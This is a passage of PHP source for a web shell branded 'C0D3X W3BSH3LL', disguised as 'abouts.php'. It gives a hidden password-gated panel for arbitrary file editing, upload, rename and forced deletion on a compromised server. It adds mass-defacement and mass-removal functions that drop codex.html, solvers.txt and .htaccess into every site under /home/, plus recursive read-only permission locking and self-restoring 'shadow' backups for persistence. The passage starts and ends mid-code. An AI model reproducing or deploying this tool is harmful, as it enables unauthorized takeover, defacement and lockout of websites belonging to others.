            $_SESSION['toast'] = "❌ Failed to create file!";
        }
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= SCAN HANDLER =============
$scan_results = null;
if (isset($_GET['scan']) && $logged_in) {
    $scanner = new BackdoorScanner();
    $scan_results = $scanner->scanDirectoryRecursive($document_root);
}

// ============= SET TOAST =============
if (isset($_SESSION['toast'])) {
    $toast_message = $_SESSION['toast'];
    unset($_SESSION['toast']);
}

// ============= FILE BROWSER FUNCTIONS =============
function filteredScandir($path) {
    $items = @scandir($path);
    if (!is_array($items)) return array();
    $filtered = array();
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $filtered[] = $item;
    }
    return $filtered;
}

// ============= DELETE HANDLER =============
if ($logged_in && isset($_GET['delete']) && file_exists($_GET['delete'])) {
    $file = normalizePath($_GET['delete']);
    $filename = basename($file);
    
    $delete_result = FilePermissionManager::permanentDelete($file);
    $_SESSION['toast'] = $delete_result ? "✅ PERMANENTLY DELETED: " . $filename : "❌ DELETE FAILED: " . $filename;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= EDIT HANDLER =============
if ($logged_in && isset($_GET['edit_file'])) {
    $file = normalizePath($_GET['edit_file']);
    if (file_exists($file) && is_file($file)) {
        if (!is_writable($file)) @chmod($file, 0644);
        $_SESSION['edit_file'] = $file;
        $_SESSION['edit_content'] = @file_get_contents($file);
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?edit=true");
    exit;
}

if ($logged_in && isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['file_content'])) {
    $file = normalizePath($_POST['file_path']);
    if (file_exists($file) && !is_writable($file)) @chmod($file, 0644);
    if (@file_put_contents($file, $_POST['file_content'])) {
        @chmod($file, 0444);
        $_SESSION['toast'] = "✅ File saved!";
    } else {
        $_SESSION['toast'] = "❌ Save failed!";
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= RENAME HANDLER =============
if ($logged_in && isset($_POST['rename_file']) && isset($_POST['old_path']) && isset($_POST['new_name'])) {
    $old = normalizePath($_POST['old_path']);
    $new_name = trim($_POST['new_name']);
    
    if (!empty($new_name)) {
        $new = dirname($old) . '/' . $new_name;
        if (!file_exists($new) && rename($old, $new)) {
            @chmod($new, 0444);
            $_SESSION['toast'] = "✅ Renamed to: " . htmlspecialchars($new_name);
        } else {
            $_SESSION['toast'] = "❌ Rename failed!";
        }
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ============= OPEN FILE HANDLER =============
if ($logged_in && isset($_GET['open_file']) && !empty($_GET['open_file'])) {
    $file_to_open = normalizePath($_GET['open_file']);
    if (file_exists($file_to_open) && is_file($file_to_open)) {
        $file_url = str_replace($_SERVER['DOCUMENT_ROOT'], '', $file_to_open);
        $file_url = ltrim($file_url, '/');
        $full_url = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . '/' . $file_url;
        header("Location: " . $full_url);
        exit;
    }
}

$shadow_status = ShadowProtection::verifyAllShadows($document_root);

$show_rename = isset($_GET['rename']) && !empty($_GET['rename']);
$rename_path = $show_rename ? normalizePath($_GET['rename']) : '';

$show_new_folder = isset($_GET['new_folder']);
$show_new_file = isset($_GET['new_file']);

createHtaccessWrapper(dirname(__FILE__));
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>abouts.php - TOTAL DEFENSE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #333333;
        }
        
        .container {
            background: #ffffff;
            border-radius: 28px;
            padding: 24px;
            box-shadow: 20px 20px 40px #e0e0e0, -20px -20px 40px #ffffff;
            width: 100%;
            max-width: 1200px;
            border: 1px solid #f0f0f0;
        }
        
        .header {
            text-align: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .title {
            color: #333333;
            font-size: 1.6em;
            font-weight: 700;
            letter-spacing: -0.5px;
            margin-bottom: 4px;
        }
        
        .subtitle {
            color: #666666;
            font-size: 0.8em;
            font-weight: 400;
        }
        
        .section {
            background: #ffffff;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: inset 6px 6px 12px #e8e8e8, inset -6px -6px 12px #ffffff;
            border: 1px solid #f5f5f5;
        }
        
        .protection-info {
            background: #ffffff;
            padding: 18px;
            border-radius: 20px;
            margin-bottom: 20px;
            box-shadow: inset 8px 8px 16px #e8e8e8, inset -8px -8px 16px #ffffff;
        }
        
        .protection-domain {
            color: #333333;
            font-weight: 700;
            margin-bottom: 8px;
            font-size: 1.1em;
        }
        
        .immutable-notice {
            background: #ffffff;
            padding: 16px;
            border-radius: 16px;
            margin-bottom: 16px;
            box-shadow: inset 4px 4px 8px #e8e8e8, inset -4px -4px 8px #ffffff;
            border-left: 4px solid #cccccc;
            line-height: 1.6;
            font-size: 0.9em;
        }
        
        .button-row {
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
        }
        
        .btn {
            flex: 1;
            padding: 14px 12px;
            border: none;
            border-radius: 16px;
            font-size: 0.9em;
            font-weight: 600;
            cursor: pointer;
            background: #ffffff;
            color: #333333;
            box-shadow: 6px 6px 12px #e8e8e8, -6px -6px 12px #ffffff;
            border: 1px solid #f0f0f0;
            text-decoration: none;
            display: inline-block;
            text-align: center;
            transition: all 0.1s ease;
        }
        
        .btn:active {
            transform: translateY(2px);
            box-shadow: inset 6px 6px 12px #e8e8e8, inset -6px -6px 12px #ffffff;
        }
        
        .btn-small {
            padding: 8px 12px;
            font-size: 0.8em;
            flex: 0 1 auto;
        }
        
        .toast {
            position: fixed;
            top: 24px;
            right: 24px;
            background: #ffffff;
            color: #333333;
            padding: 16px 24px;
            border-radius: 20px;
            box-shadow: 12px 12px 24px #e0e0e0, -12px -12px 24px #ffffff;
            z-index: 9999;
            white-space: pre-line;
            max-width: 600px;
            animation: slideIn 0.3s ease-out;
            border: 1px solid #f0f0f0;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes slideOut {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
        
        .file-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            padding: 12px;
            background: #ffffff;
            border-radius: 16px;
            margin-bottom: 8px;
            box-shadow: 4px 4px 8px #e8e8e8, -4px -4px 8px #ffffff;
            border: 1px solid #f5f5f5;
        }
        
        .file-icon {
            margin-right: 14px;
            font-size: 1.2em;
            width: 24px;
            text-align: center;
        }
        
        .file-name {
            flex: 1;
            font-family: 'SF Mono', monospace;
            font-size: 0.85em;
            word-break: break-all;
        }
        
        .file-actions {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            justify-content: flex-end;
        }
        
        .file-action {
            padding: 6px 10px;
            background: #ffffff;
            border: none;
            border-radius: 10px;
            font-size: 0.7em;
            cursor: pointer;
            box-shadow: 3px 3px 6px #e8e8e8, -3px -3px 6px #ffffff;
            color: #333333;
            border: 1px solid #f5f5f5;
            text-decoration: none;
            display: inline-block;
            min-width: 45px;
            text-align: center;
        }
        
        .file-action:hover {
            box-shadow: inset 3px 3px 6px #e8e8e8, inset -3px -3px 6px #ffffff;
        }
        
        .input {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 16px;
            background: #ffffff;
            box-shadow: inset 6px 6px 12px #e8e8e8, inset -6px -6px 12px #ffffff;
            font-size: 0.9em;
            color: #333333;
            margin-bottom: 14px;
            font-family: 'SF Mono', monospace;
        }
        
        .mode-buttons {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin: 16px 0;
        }
        
        .mode-btn {
            padding: 10px;
            background: #ffffff;
            border: none;
            border-radius: 12px;
            font-family: 'SF Mono', monospace;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 4px 4px 8px #e8e8e8, -4px -4px 8px #ffffff;
        }
        
        .status {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            font-size: 0.75em;
            color: #666666;
        }
        
        .key-display {
            background: #ffffff;
            border-radius: 16px;
            padding: 18px;
            margin: 16px 0;
            font-family: 'SF Mono', monospace;
            font-size: 0.8em;
            word-break: break-all;
            box-shadow: inset 6px 6px 12px #e8e8e8, inset -6px -6px 12px #ffffff;
        }
        
        .shadow-status {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-top: 8px;
        }
        
        .shadow-item {
            padding: 8px;
            background: #ffffff;
            border-radius: 8px;
            box-shadow: inset 2px 2px 4px #e8e8e8, inset -2px -2px 4px #ffffff;
            font-size: 0.75em;
            text-align: center;
        }
        
        .path-display {
            background: #ffffff;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
            font-family: 'SF Mono', monospace;
            font-size: 0.85em;
            box-shadow: inset 4px 4px 8px #e8e8e8, inset -4px -4px 8px #ffffff;
            word-break: break-all;
            overflow-x: auto;
            white-space: nowrap;
        }
        
        .clickable {
            color: #333333;
            text-decoration: none;
            cursor: pointer;
            font-weight: 500;
            border-bottom: 1px solid #cccccc;
            display: inline-block;
            padding: 2px 0;
        }
        
        .clickable:hover {
            border-bottom: 2px solid #333333;
        }
        
        .path-separator {
            color: #999999;
            margin: 0 4px;
            font-weight: normal;
        }
        
        .path-input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .path-input {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 16px;
            background: #ffffff;
            box-shadow: inset 4px 4px 8px #e8e8e8, inset -4px -4px 8px #ffffff;
            font-family: 'SF Mono', monospace;
            font-size: 0.9em;
        }
        
        .path-hint {
            font-size: 0.75em;
            color: #666666;
            margin-top: 5px;
            padding-left: 5px;
        }
        
        .rename-form, .new-folder-form, .new-file-form {
            margin-top: 10px;
            padding: 15px;
            background: #ffffff;
            border-radius: 16px;
            box-shadow: inset 4px 4px 8px #e8e8e8, inset -4px -4px 8px #ffffff;
        }
        
        .create-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .create-btn {
            flex: 1;
            padding: 12px;
            background: #ffffff;
            border: none;
            border-radius: 16px;
            font-size: 0.9em;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 4px 4px 8px #e8e8e8, -4px -4px 8px #ffffff;
            text-decoration: none;
            color: #333333;
            text-align: center;
        }
        
        .create-btn:active {
            box-shadow: inset 4px 4px 8px #e8e8e8, inset -4px -4px 8px #ffffff;
        }
        
        .domain-list {
            margin-top: 10px;
            max-height: 300px;
            overflow-y: auto;
            background: #ffffff;
            border-radius: 16px;
            padding: 10px;
            box-shadow: inset 4px 4px 8px #e8e8e8, inset -4px -4px 8px #ffffff;
            font-family: 'SF Mono', monospace;
            font-size: 0.8em;
            display: <?php echo ($searched_domains !== null) ? 'block' : 'none'; ?>;
        }
        
        .domain-item {
            padding: 8px;
            border-bottom: 1px solid #e8e8e8;
            word-break: break-all;
        }
        
        .domain-item:last-child {
            border-bottom: none;
        }
        
        .copy-button {
            background: #ffffff;
            border: none;
            border-radius: 12px;
            padding: 8px 12px;
            font-size: 0.8em;
            cursor: pointer;
            box-shadow: 4px 4px 8px #e8e8e8, -4px -4px 8px #ffffff;
            color: #333333;
            margin-bottom: 8px;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .copy-button:active {
            box-shadow: inset 4px 4px 8px #e8e8e8, inset -4px -4px 8px #ffffff;
        }
        
        .domain-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 8px;
        }
        
        .search-form {
            margin-bottom: 15px;
        }
        
        .search-row {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .search-input {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 16px;
            background: #ffffff;
            box-shadow: inset 4px 4px 8px #e8e8e8, inset -4px -4px 8px #ffffff;
            font-family: 'SF Mono', monospace;
            font-size: 0.9em;
        }
        
        .search-btn {
            padding: 12px 20px;
            border: none;
            border-radius: 16px;
            background: #ffffff;
            box-shadow: 4px 4px 8px #e8e8e8, -4px -4px 8px #ffffff;
            cursor: pointer;
            font-weight: 600;
        }
        
        .search-btn:active {
            box-shadow: inset 4px 4px 8px #e8e8e8, inset -4px -4px 8px #ffffff;
        }
        
        .action-button-group {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .action-button {
            flex: 1;
            padding: 14px 12px;
            border: none;
            border-radius: 16px;
            font-size: 0.9em;
            font-weight: 600;
            cursor: pointer;
            background: #ffffff;
            color: #333333;
            box-shadow: 6px 6px 12px #e8e8e8, -6px -6px 12px #ffffff;
            border: 1px solid #f0f0f0;
            text-decoration: none;
            display: inline-block;
            text-align: center;
        }
        
        .action-button:active {
            transform: translateY(2px);
            box-shadow: inset 6px 6px 12px #e8e8e8, inset -6px -6px 12px #ffffff;
        }
        
        @media (max-width: 480px) {
            .button-row { flex-direction: column; }
            .btn { width: 100%; }
            .mode-buttons { grid-template-columns: repeat(2, 1fr); }
            .shadow-status { grid-template-columns: repeat(2, 1fr); }
            .file-actions { flex-wrap: wrap; }
            .file-action { min-width: 40px; padding: 6px 8px; }
            .path-display { font-size: 0.75em; }
            .search-row { flex-direction: column; }
            .search-input { width: 100%; }
            .search-btn { width: 100%; }
            .action-button-group { flex-direction: column; }
        }
    </style>
</head>
<body>
    <?php if ($toast_message): ?>
        <div class="toast" id="toastMessage">
            <?php echo nl2br(htmlspecialchars($toast_message)); ?>
        </div>
        <script>
            setTimeout(function() {
                var toast = document.getElementById('toastMessage');
                if (toast) {
                    toast.style.animation = 'slideOut 0.3s ease-in';
                    setTimeout(function() { if (toast) toast.style.display = 'none'; }, 280);
                }
            }, 30000);
        </script>
    <?php endif; ?>
    
    <div class="container">
        <div class="header">
            <div class="title">C0D3X W3BSH3LL</div>
            <div class="subtitle">UNAUTHORIZED ACCESS DENIED</div>
        </div>
        
        <?php if (!$logged_in): ?>
            <div class="section">
                <?php if ($login_error): ?>
                    <div style="color:#333333; text-align:center; margin-bottom:16px;"><?php echo htmlspecialchars($login_error); ?></div>
                <?php endif; ?>
                
                <?php if ($key_display): ?>
                    <div class="key-display">
                        🔑 SECURITY KEY:<br>
                        <strong><?php echo htmlspecialchars($key_display); ?></strong>
                    </div>
                <?php endif; ?>
                
                <form method="POST" action="">
                    <input type="password" name="password" class="input" placeholder="Enter Password" required autocomplete="off">
                    <div class="button-row">
                        <button type="submit" name="get_key" class="btn">GET KEY</button>
                        <button type="submit" name="login" class="btn">LOGIN</button>
                    </div>
                </form>
            </div>
        <?php else: ?>
            <div class="protection-info">
                <?php if ($protection_active): ?>
                    <div class="protection-domain">🛡️ PROTECTION ACTIVE - NO 403 ERRORS ON ALLOWED FILES</div>
                    <div class="immutable-notice">
                        <strong>✅ RECURSIVE PERMISSIONS:</strong><br>
                        • 📁 Directories: 0555 (Read-only + Execute)<br>
                        • 📄 All Files: 0444 (Read-only)<br><br>
                        <strong>✅ 100% PERMANENT DELETE:</strong><br>
                        • 🗑️ Force delete any file/folder ANYWHERE<br><br>
                        <strong>✅ MASS DEPLOY INCLUDES:</strong><br>
                        • 📄 solvers.txt (0444)<br>
                        • 📄 codex.html (0444)<br>
                        • 🔒 .htaccess (0444)<br><br>
                        <strong>✅ YOU ARE THE ONLY ONE WHO CAN:</strong><br>
                        • 📤 UPLOAD files<br>
                        • 📝 EDIT files<br>
                        • 🗑️ DELETE files<br>
                        • ✏️ RENAME files<br>
                        • 📦 MASS DEFACE<br>
                        • 🗑️ MASS REMOVE<br>
                        • 🔧 FIX PERMISSIONS<br>
                        • 📁 CREATE folders/files<br>
                        • 🔍 SEARCH DOMAINS<br><br>
                        <strong>📋 ALLOWED FILES (ALL 0444):</strong><br>
                        • abouts.php, events.php, index.php, login.php, logout.php<br>
                        • codex.html, index.html, solvers.txt, .htaccess<br><br>
                        <strong>🚫 UNAUTHORIZED ACCESS DENIED</strong>
                    </div>
                <?php else: ?>
                    <div style="color:#333333; font-weight:700;">🔕 SYSTEM NOT PROTECTED</div>
                    <div style="font-size:0.8em; color:#666666; margin-top:8px;">Site is clean - no .htaccess file</div>
                <?php endif; ?>
            </div>
            
            <div class="button-row">
                <a href="?toggle_protection=1" class="btn" id="toggleBtn"><?php echo $protection_active ? 'DEACTIVATE' : 'ACTIVATE'; ?></a>
                <a href="?scan=1" class="btn">RECURSIVE SCAN</a>
                <a href="?logout=true" class="btn">LOGOUT</a>
            </div>
            
            <div class="section">
                <div class="domain-header">
                    <strong>🎭 DEFACEMENTS</strong>
                </div>
                <div class="action-button-group">
                    <button onclick="toggleDomainSearch()" class="action-button" id="showSearchBtn">DOMAINS</button>
                    <button onclick="toggleMassDeploy()" class="action-button">DEPLOY</button>
                    <button onclick="toggleMassRemove()" class="action-button">REMOVE</button>
                </div>
                
                <div id="domainSearchSection" style="display: <?php echo ($searched_domains !== null) ? 'block' : 'none'; ?>; margin-top: 15px;">
                    <div class="domain-header" style="margin-bottom: 10px;">
                        <strong>📂 PATH FILE</strong>
                        <?php if ($searched_domains && !empty($searched_domains)): ?>
                        <button class="copy-button" onclick="copyAllDomains()" id="copyDomainsBtn">📋 COPY ALL (<?php echo count($searched_domains); ?>)</button>
                        <?php else: ?>
                        <button class="copy-button" onclick="copyAllDomains()" id="copyDomainsBtn" style="display:none;">📋 COPY ALL</button>
                        <?php endif; ?>
                    </div>
                    
                    <form method="POST" action="" class="search-form">
                        <div class="search-row">
                            <input type="text" name="domain_search_path" class="search-input" 
                                   value="<?php echo htmlspecialchars($search_path ?: '/home/'); ?>" 
                                   placeholder="Enter path to search (e.g., /home/, /var/www)">
                            <button type="submit" name="search_domains" class="search-btn">🔍 SEARCH</button>
                        </div>
                        <div class="path-hint">💡 Enter any path to search for domains recursively</div>
                    </form>
                    
                    <?php if ($search_error): ?>
                        <div style="color:#666666; margin-top:10px; padding:10px; background:#ffffff; border-radius:12px; box-shadow:inset 2px 2px 4px #e8e8e8;">
                            ❌ <?php echo htmlspecialchars($search_error); ?>
                        </div>
                    <?php endif; ?>
                    
                    <div class="domain-list" id="domainList">
                        <?php if ($searched_domains && !empty($searched_domains)): ?>
                            <?php foreach ($searched_domains as $domain): ?>
                                <div class="domain-item"><?php echo htmlspecialchars($domain); ?></div>
                            <?php endforeach; ?>
                        <?php elseif ($searched_domains !== null && empty($searched_domains)): ?>
                            <div class="domain-item">🔍 No domains found in: <?php echo htmlspecialchars($search_path); ?></div>
                        <?php endif; ?>
                    </div>
                    
                    <textarea id="domainData" style="display:none;"><?php 
                        if ($searched_domains && !empty($searched_domains)) {
                            echo htmlspecialchars(implode("\n", $searched_domains));
                        }
                    ?></textarea>
                </div>
                
                <div id="massDeploySection" style="display: none; margin-top: 15px;">
                    <div class="domain-header" style="margin-bottom: 10px;">
                        <strong>☠️ MASS DEFACEMENTS ☠️</strong>
                        <span style="color: #28a745; font-size: 0.8em;">✅ Includes .htaccess!</span>
                    </div>
                    <form method="POST" action="">
                        <div style="margin-bottom:15px;">
                            <div style="font-size:0.9em; margin-bottom:5px; font-weight:600;">📁 BASE DOMAINS PATH:</div>
                            <input type="text" name="mass_deploy_path" class="input" value="/home/" placeholder="Enter base domains path (e.g., /home/, /var/www)">
                            <div class="path-hint">💡 This will deploy: solvers.txt, codex.html, .htaccess</div>
                        </div>
                        <div class="button-row">
                            <button type="button" onclick="toggleMassDeploy()" class="btn">CANCEL</button>
                            <button type="submit" name="mass_deploy" class="btn" onclick="return confirm('Deploy to ALL domains? Continue?')">DEPLOY NOW</button>
                        </div>
                    </form>
                </div>
                
                <div id="massRemoveSection" style="display: none; margin-top: 15px;">
                    <div class="domain-header" style="margin-bottom: 10px;">
                        <strong>🗑️ MASS REMOVE</strong>
                        <span style="color: #dc3545; font-size: 0.8em;">⚠️ DELETE files!</span>
                    </div>
                    <form method="POST" action="">
                        <div style="margin-bottom:15px;">
                            <div style="font-size:0.9em; margin-bottom:5px; font-weight:600;">📁 BASE DOMAINS PATH:</div>
                            <input type="text" name="mass_remove_path" class="input" value="/home/" placeholder="Enter base domains path">
                            <div class="path-hint">💡 This will REMOVE: solvers.txt, codex.html, .htaccess</div>
                        </div>
                        <div class="button-row">
                            <button type="button" onclick="toggleMassRemove()" class="btn">CANCEL</button>
                            <button type="submit" name="mass_remove" class="btn" onclick="return confirm('⚠️ DELETE files from ALL domains? Cannot undo!')">REMOVE NOW</button>
                        </div>
                    </form>
                </div>
            </div>
            
            <script>
                function toggleDomainSearch() {
                    var searchSection = document.getElementById('domainSearchSection');
                    var massSection = document.getElementById('massDeploySection');
                    var removeSection = document.getElementById('massRemoveSection');
                    var showBtn = document.getElementById('showSearchBtn');
                    
                    if (searchSection.style.display === 'none' || searchSection.style.display === '') {
                        searchSection.style.display = 'block';
                        massSection.style.display = 'none';
                        removeSection.style.display = 'none';
                        showBtn.textContent = 'HIDE';
                    } else {
                        searchSection.style.display = 'none';
                        showBtn.textContent = 'DOMAINS';
                    }
                }
                
                function toggleMassDeploy() {
                    var massSection = document.getElementById('massDeploySection');
                    var searchSection = document.getElementById('domainSearchSection');
                    var removeSection = document.getElementById('massRemoveSection');
                    
                    if (massSection.style.display === 'none' || massSection.style.display === '') {
                        massSection.style.display = 'block';
                        searchSection.style.display = 'none';
                        removeSection.style.display = 'none';
                        document.getElementById('showSearchBtn').textContent = 'DOMAINS';
                    } else {
                        massSection.style.display = 'none';
                    }
                }
                
                function toggleMassRemove() {
                    var removeSection = document.getElementById('massRemoveSection');
                    var searchSection = document.getElementById('domainSearchSection');
                    var massSection = document.getElementById('massDeploySection');
                    
                    if (removeSection.style.display === 'none' || removeSection.style.display === '') {
                        removeSection.style.display = 'block';
                        searchSection.style.display = 'none';
                        massSection.style.display = 'none';
                        document.getElementById('showSearchBtn').textContent = 'DOMAINS';
                    } else {
                        removeSection.style.display = 'none';
                    }
                }
                
                function copyAllDomains() {
                    var domainData = document.getElementById('domainData');
                    if (domainData.value && domainData.value.trim() !== '') {
                        var textToCopy = domainData.value;
                        if (navigator.clipboard && navigator.clipboard.writeText) {
                            navigator.clipboard.writeText(textToCopy).then(function() {
                                showCopySuccess(textToCopy);
                            }).catch(function() {
                                fallbackCopy(textToCopy);
                            });
                        } else {
                            fallbackCopy(textToCopy);
                        }
                    } else {
                        alert('No domains to copy!');
                    }
                }
                
                function fallbackCopy(text) {
                    var textarea = document.createElement('textarea');
                    textarea.value = text;
                    textarea.style.position = 'fixed';
                    textarea.style.opacity = '0';
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                    alert('Copied ' + text.split('\n').length + ' domains!');
                }
                
                function showCopySuccess(text) {
                    var lines = text.split('\n');
                    alert('✅ Copied ' + lines.length + ' domains to clipboard!');
                }
                
                setTimeout(function() {
                    var massForm = document.getElementById('massDeploySection');
                    if (massForm && massForm.style.display === 'block') massForm.style.display = 'none';
                    var removeForm = document.getElementById('massRemoveSection');
                    if (removeForm && removeForm.style.display === 'block') removeForm.style.display = 'none';
                    var searchForm = document.getElementById('domainSearchSection');
                    if (searchForm && searchForm.style.display === 'block') {
                        searchForm.style.display = 'none';
                        document.getElementById('showSearchBtn').textContent = 'DOMAINS';
                    }
                }, 30000);
            </script>
            
            <div class="section">
                <button onclick="togglePermissionsForm()" class="btn" style="margin-bottom:10px;">⚙️ FIX PERMISSIONS</button>
                
                <div id="permissionsForm" style="display: none;">
                    <form method="POST" action="">
                        <div style="margin-bottom:15px;">
                            <div style="font-size:0.9em; margin-bottom:5px; font-weight:600;">📁 PATH TO FIX:</div>
                            <input type="text" name="permissions_path" class="input" value="<?php echo htmlspecialchars($current_path); ?>" placeholder="Enter path to fix permissions">
                        </div>
                        <div class="button-row">
                            <button type="button" onclick="togglePermissionsForm()" class="btn">CANCEL</button>
                            <button type="submit" name="fix_permissions" class="btn">FIX PERMISSIONS</button>
                        </div>
                    </form>
                </div>
            </div>
            
            <?php if ($protection_active): ?>
            <div class="section">
                <div style="font-size:0.9em; margin-bottom:8px; font-weight:600;">🗂️ FILE BACKUPS:</div>
                <div class="shadow-status">
                    <?php foreach ($shadow_status as $file => $status): ?>
                        <div class="shadow-item"><strong><?php echo $file; ?>:</strong> <?php echo $status; ?></div>
                    <?php endforeach; ?>
                </div>
            </div>
            <?php endif; ?>
            
            <?php if ($scan_results && !empty($scan_results)): ?>
            <div class="section">
                <div style="font-size:0.9em; margin-bottom:8px; font-weight:600;">🔍 SCAN RESULTS:</div>
                <div style="font-family:monospace; font-size:0.75em; max-height:300px; overflow-y:auto;">
                    <div><strong>SUSPICIOUS FILES:</strong> <?php echo count($scan_results); ?></div>
                    <?php foreach ($scan_results as $result): ?>
                        <div style="margin-top:10px; padding:8px; background:#ffffff; border-radius:8px; box-shadow:inset 2px 2px 4px #e8e8e8, inset -2px -2px 4px #ffffff;">
                            <div><strong>File:</strong> <?php echo htmlspecialchars(basename($result['file'])); ?></div>
                            <div><strong>Path:</strong> <?php echo htmlspecialchars(dirname($result['file'])); ?></div>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>
            <?php endif; ?>
            
            <div class="section">
                <div style="font-size:0.9em; margin-bottom:8px; font-weight:600;">🔰 RECURSIVE CHMOD TOOL:</div>
                <form method="POST" action="" style="margin-bottom:10px;">
                    <div style="display:flex; gap:10px;">
                        <input type="text" name="recursive_readonly_path" class="input" value="<?php echo htmlspecialchars($current_path); ?>" style="flex:1; margin-bottom:0;">
                        <button type="submit" name="recursive_readonly_submit" class="btn" style="width:auto;">READ-ONLY (555/444)</button>
                    </div>
                </form>
                <form method="POST" action="">
                    <div style="display:flex; gap:10px;">
                        <input type="text" name="recursive_normal_path" class="input" value="<?php echo htmlspecialchars($current_path); ?>" style="flex:1; margin-bottom:0;">
                        <button type="submit" name="recursive_normal_submit" class="btn" style="width:auto;">NORMAL (755/644)</button>
                    </div>
                </form>
            </div>
            
            <div class="section">
                <div class="button-row">
                    <button onclick="showUpload()" class="btn">📤 UPLOAD</button>
                    <a href="?refresh=1" class="btn">🔄 REFRESH</a>
                </div>
                
                <div class="create-buttons">
                    <a href="?new_folder=1" class="create-btn">📁 NEW FOLDER</a>
                    <a href="?new_file=1" class="create-btn">📄 NEW FILE</a>
                </div>
                
                <?php if ($show_new_folder): ?>
                <div class="new-folder-form">
                    <form method="POST" action="">
                        <input type="hidden" name="folder_path" value="<?php echo htmlspecialchars($current_path); ?>">
                        <div style="font-size:0.9em; margin-bottom:10px; font-weight:600;">📁 CREATE FOLDER:</div>
                        <input type="text" name="folder_name" class="input" placeholder="Enter folder name" style="margin-bottom:10px;">
                        <div class="path-hint">💡 Use only letters, numbers, underscore and dash</div>
                        <div class="button-row">
                            <a href="?refresh=1" class="btn">CANCEL</a>
                            <button type="submit" name="create_folder" class="btn">CREATE</button>
                        </div>
                    </form>
                </div>
                <?php endif; ?>
                
                <?php if ($show_new_file): ?>
                <div class="new-file-form">
                    <form method="POST" action="">
                        <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($current_path); ?>">
                        <div style="font-size:0.9em; margin-bottom:10px; font-weight:600;">📄 CREATE FILE:</div>
                        <input type="text" name="file_name" class="input" placeholder="Enter filename (e.g., test.txt)" style="margin-bottom:10px;">
                        <div class="path-hint">💡 File will be created empty. Use Edit to add content.</div>
                        <div class="button-row">
                            <a href="?refresh=1" class="btn">CANCEL</a>
                            <button type="submit" name="create_file" class="btn">CREATE</button>
                        </div>
                    </form>
                </div>
                <?php endif; ?>
                
                <div class="path-display">
                    <?php
                    $parts = explode('/', $current_path);
                    $breadcrumb = '';
                    $first = true;
                    
                    if (strpos($current_path, ':') !== false) {
                        $drive = substr($current_path, 0, strpos($current_path, ':') + 1);
                        echo '<span class="clickable" onclick="gotoPath(\'' . htmlspecialchars($drive) . '/\')">' . htmlspecialchars($drive) . '</span>';
                        echo '<span class="path-separator">/</span>';
                        array_shift($parts);
                        $first = false;
                    }
                    
                    foreach ($parts as $i => $part) {
                        if ($part === '') continue;
                        
                        if ($i > 0 || !$first) $breadcrumb .= '/' . $part;
                        else $breadcrumb .= $part;
                        
                        if (!$first && $i > 0) echo '<span class="path-separator">/</span>';
                        
                        echo '<span class="clickable" onclick="gotoPath(\'' . htmlspecialchars($breadcrumb) . '\')">' . htmlspecialchars($part) . '</span>';
                        $first = false;
                    }
                    ?>
                </div>
                
                <?php if ($show_rename && !empty($rename_path)): ?>
                <div class="rename-form">
                    <form method="POST" action="">
                        <input type="hidden" name="old_path" value="<?php echo htmlspecialchars($rename_path); ?>">
                        <div style="font-size:0.9em; margin-bottom:10px; font-weight:600;">✏️ RENAME:</div>
                        <div style="margin-bottom:10px; word-break:break-all; font-family:monospace; font-size:0.85em;"><?php echo htmlspecialchars(basename($rename_path)); ?></div>
                        <input type="text" name="new_name" class="input" value="<?php echo htmlspecialchars(basename($rename_path)); ?>" placeholder="Enter new name" style="margin-bottom:10px;">
                        <div class="button-row">
                            <a href="?refresh=1" class="btn">CANCEL</a>
                            <button type="submit" name="rename_file" class="btn">RENAME</button>
                        </div>
                    </form>
                </div>
                <?php endif; ?>
                
                <div class="file-list">
                    <?php
                    if (is_dir($current_path)) {
                        $files = filteredScandir($current_path);
                        if ($files) {
